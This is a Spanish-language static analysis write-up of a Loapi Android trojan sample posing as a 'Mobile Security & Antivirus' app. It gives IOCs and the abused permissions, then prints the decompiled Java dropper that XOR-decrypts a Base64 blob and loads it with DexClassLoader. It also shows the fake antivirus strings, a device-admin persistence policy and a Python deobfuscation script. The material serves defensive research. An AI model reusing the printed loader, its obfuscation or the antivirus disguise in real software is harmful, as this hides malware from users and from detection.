# 🛡️ Análisis Técnico: Troyano Modular Loapi (Android)

Análisis estático y deobfuscación de una muestra del troyano modular **Loapi**, disfrazado como una aplicación legítima de seguridad ("Mobile Security & Antivirus"). Esta muestra destaca por su arquitectura modular persistente y el uso de técnicas de carga dinámica de código para evadir la detección.

---

## 📊 Ficha Técnica de la Muestra

*   **Nombre Falso:** `Mobile Security & Antivirus`
*   **Nombre de Paquete:** `com.iakfkwlzbz.zrickey`
*   **Clasificación:** Troyano Modular / Dropper (Loapi)
*   **Peligrosidad:** ⚠️ 9/10
*   **Hash SHA-256:** `6f28c82d3120616393b797a3589736fbeecc5eef45d3bb364e857cfc4a27e66e`
*   **Documentación:** [loapi-trojan-antivirus.pdf](https://zenodo.org/records/23937756)

---

## 📝 Resumen del Análisis

La muestra analizada actúa como un **dropper/cargador**. Utiliza un mecanismo de ofuscación basado en **Base64 combinado con un cifrado XOR simétrico** para ocultar el payload real dentro de los recursos o el propio código de la aplicación. 

En tiempo de ejecución, la clase principal `dqmqtr` (que extiende de `Application`) intercepta el contexto mediante `attachBaseContext`, descifra el archivo oculto en memoria, lo escribe temporalmente como un archivo `.zip` y utiliza `DexClassLoader` para realizar una **carga dinámica de clases (DEX Loading)**. El payload ejecutado activa módulos maliciosos independientes que incluyen minería de criptomonedas, ataques DDoS, interceptación y envío de SMS premium, y exfiltración de datos sensibles.

---

## 🛡️ Consideraciones Éticas y de Seguridad

> ⚠️ **Aviso de Uso Educativo:** Este repositorio **no incluye muestras ejecutables ni binarios de malware**. El código expuesto son fragmentos estáticos de ingeniería inversa descompilados con fines estrictamente educativos, de investigación y análisis defensivo. Ninguna prueba fue ejecutada en entornos de producción o dispositivos reales fuera de una sandbox aislada.

---

## 🔍 Indicadores de Compromiso (IOCs)

<details>
<summary><b>Click para expandir la lista completa de IOCs 📋</b></summary>

### 🔑 Componentes Clave
*   **Hash SHA-256:** `6f28c82d3120616393b797a3589736fbeecc5eef45d3bb364e857cfc4a27e66e`
*   **Clave de Cifrado XOR:** `LdFYsLeIUCTRkoxJaYZZNVFD`
*   **Archivo Generado en Tiempo de Ejecución:** `WOOvswPFqkWMCQLONbbsBIkBvdcUUFQpETYZCqYBrVNmfGpDu.zip`
*   **Clase Cargada Dinámicamente:** `uyzmltjlup/pevkpyz`
*   **Device Admin XML (Configuración):** `aknezwu`
*   **URL Scheme personalizado:** `mploader`

### 🏗️ Arquitectura de Clases y Servicios
*   `fsdakuwrq.dqmqtr` (Application Loader principal)
*   `com.iakfkwlzbz.zrickey.C44EjAjutB6h` (DeviceAdminReceiver para persistencia)
*   `com.iakfkwlzbz.zrickey.JFRznzc4` (BroadcastReceiver principal)

**Servicios Maliciosos Identificados:**
*   `H7vbh31`
*   `N2v91shiFRLm`
*   `YxtlS23EsiFQ`
*   `I1UBLrA2v1`
*   `Ice7Fach0VsYz`
*   `BCZuPOcjo9Jf9`
*   `QKy0Pj9k6`
*   `GuCDa8L51`

**Paquetes Ofuscados Internos:**
*   `zofccs.uigedg.kmmm.loz.hts.hokuo`
*   `rpntwalfa.tyztjfe.qdhq.ghujrz.prxck.dwzeoscn`
*   `lsqsju.agghbpzbx.surdnva`

### 🚨 Permisos Peligrosos Solicitados
El troyano abusa de los siguientes permisos en el `AndroidManifest.xml` para tomar control del dispositivo y monetizar su actividad:
*   `READ_PHONE_STATE` (Identificación del dispositivo)
*   `INTERNET` & `ACCESS_NETWORK_STATE` / `CHANGE_NETWORK_STATE` (C2 Communication)
*   `WRITE_EXTERNAL_STORAGE` (Persistencia de payloads)
*   `READ_CONTACTS` & `READ_PROFILE` (Cosecha de datos)
*   `RECEIVE_BOOT_COMPLETED` (Persistencia tras reinicios)
*   `GET_TASKS` / `REAL_GET_TASKS` (Monitoreo de apps activas)
*   `READ_SMS` / `RECEIVE_SMS` (Fraude de SMS Premium y bypass de 2FA)
*   `WAKE_LOCK` (Evitar que el procesador entre en suspensión durante la minería)
</details>

---

## 💻 Código Fuente Analizado

### 1. Cargador Principal (`dqmqtr.java`)
Este fragmento muestra cómo se intercepta la carga de la aplicación para extraer de forma dinámica el archivo cifrado y levantar la clase maliciosa en memoria.

<details>
<summary><b>Ver código fuente Java ☕</b></summary>

```java
// Fragmento estático extraído de fsdakuwrq/dqmqtr.java
package fsdakuwrq;

import android.app.Application;
import android.content.Context;
import android.util.Base64;
import dalvik.system.DexClassLoader;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;

public class dqmqtr extends Application {
    Object BiifeAjCostuosvJjzEMFUBPiBkWngtFGZSA = null;

    @Override
    public void attachBaseContext(Context StHoONAcEbWRfpQPJum) {
        super.attachBaseContext(StHoONAcEbWRfpQPJum);
        int a = 5 + 1;
        File WOOvswPFqkWMCQLONbbsBIkBvdcUUFQpETYZCqYBrVNmfGpDu = new File(StHoONAcEbWRfpQPJum.getFilesDir(), "WOOvswPFqkWMCQLONbbsBIkBvdcUUFQpETYZCqYBrVNmfGpDu.zip");
        byte[] zICYFdgsoIVTmyeocdxHimE = Base64.decode("HC9FXWdMZUldQ...", a - 6);
        byte[] vtnpurrMHAKJBGxGmlGCx = BBfmyplHVVSftSfqjwcEmQEaWHLSaZRiqMvdcLWTfZxv(zICYFdgsoIVTmyeocdxHimE, "LdFYsLeIUCTRkoxJaYZZNVFD".getBytes());
        try {
            BufferedOutputStream YlYkSTbtJmA = new BufferedOutputStream(new FileOutputStream(WOOvswPFqkWMCQLONbbsBIkBvdcUUFQpETYZCqYBrVNmfGpDu));
            YlYkSTbtJmA.write(vtnpurrMHAKJBGxGmlGCx);
            closeStream(YlYkSTbtJmA);
            this.BiifeAjCostuosvJjzEMFUBPiBkWngtFGZSA = new DexClassLoader(WOOvswPFqkWMCQLONbbsBIkBvdcUUFQpETYZCqYBrVNmfGpDu.getAbsolutePath(), StHoONAcEbWRfpQPJum.getFilesDir().getAbsolutePath(), null, StHoONAcEbWRfpQPJum.getClassLoader()).loadClass("uyzmltjlup/pevkpyz").getConstructor(new Class[0]).newInstance(new Object[0]);
            this.BiifeAjCostuosvJjzEMFUBPiBkWngtFGZSA.getClass().getDeclaredMethod("attachBaseContext", Class.forName("android.content.Context")).invoke(this.BiifeAjCostuosvJjzEMFUBPiBkWngtFGZSA, StHoONAcEbWRfpQPJum);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private byte[] BBfmyplHVVSftSfqjwcEmQEaWHLSaZRiqMvdcLWTfZxv(byte[] QAbwEXNDygWgcd, byte[] YTbMMhwelWhoqvLdyrykxaDtLDIgelmXwnVICnAszIJYSFQK) {
        byte[] edTOoKtPAyJJiITokSBJKZKLYM = new byte[QAbwEXNDygWgcd.length];
        Long DlgWozYrSKHLzPRuTojNufh = new Long(0L);
        for (int PdLCpghHAox = 0; PdLCpghHAox < QAbwEXNDygWgcd.length; PdLCpghHAox++) {
            edTOoKtPAyJJiITokSBJKZKLYM[PdLCpghHAox] = (byte) (QAbwEXNDygWgcd[PdLCpghHAox] ^ YTbMMhwelWhoqvLdyrykxaDtLDIgelmXwnVICnAszIJYSFQK[(int) DlgWozYrSKHLzPRuTojNufh.longValue()]);
            DlgWozYrSKHLzPRuTojNufh = Long.valueOf(DlgWozYrSKHLzPRuTojNufh.longValue() + 1);
            if (DlgWozYrSKHLzPRuTojNufh.longValue() >= YTbMMhwelWhoqvLdyrykxaDtLDIgelmXwnVICnAszIJYSFQK.length) {
                DlgWozYrSKHLzPRuTojNufh = new Long(0L);
            }
        }
        return edTOoKtPAyJJiITokSBJKZKLYM;
    }
}
```
</details>

### 2. Recursos e Ingeniería Social (`strings.xml`)
El malware utiliza strings falsos para engañar al usuario haciéndose pasar por una suite de antivirus real.

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Mobile Security &amp; Antivirus</string>
    <string name="scan">Scan</string>
    <string name="scan_in_progress">Scanning, please wait...</string>
    <string name="system_clear">Nothing was found, the system is clean.</string>
    <string name="labelid">1417</string>
</resources>
```

### 3. Persistencia mediante Administrador de Dispositivos (`device_admin.xml`)
Esta política obliga al bloqueo de pantalla e impide que el usuario desinstale la aplicación de manera convencional sin retirar primero los privilegios avanzados de administración.

```xml
<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <force-lock/>
    </uses-policies>
</device-admin>
```

---

## 🛠️ Script de Deobfuscación Automática

Script desarrollado en Python para automatizar el descifrado estático del payload oculto en la muestra sin necesidad de ejecutar el malware en un entorno Android.

```python
# Script educativo de deobfuscación para la muestra Loapi
# NO ejecuta el payload, solo descifra el DEX para análisis estático
# Uso: python deobfuscator_loapi.py

import base64

# Cadena Base64 extraída de dqmqtr.java
b64 = """HC9FXWdMZUldQ..."""  # Reemplazar con la cadena completa extraída del recurso
key = b"LdFYsLeIUCTRkoxJaYZZNVFD"

# Decodificación y descifrado mediante compuerta lógica XOR iterativa
data = base64.b64decode(b64)
decrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Guardar payload listo para reversing
with open("payload.dex", "wb") as f:
    f.write(decrypted)

print("[+] Payload extraído con éxito como 'payload.dex'")
print("[!] Proceder con el análisis de ingeniería inversa utilizando JADX en una VM aislada.")
```
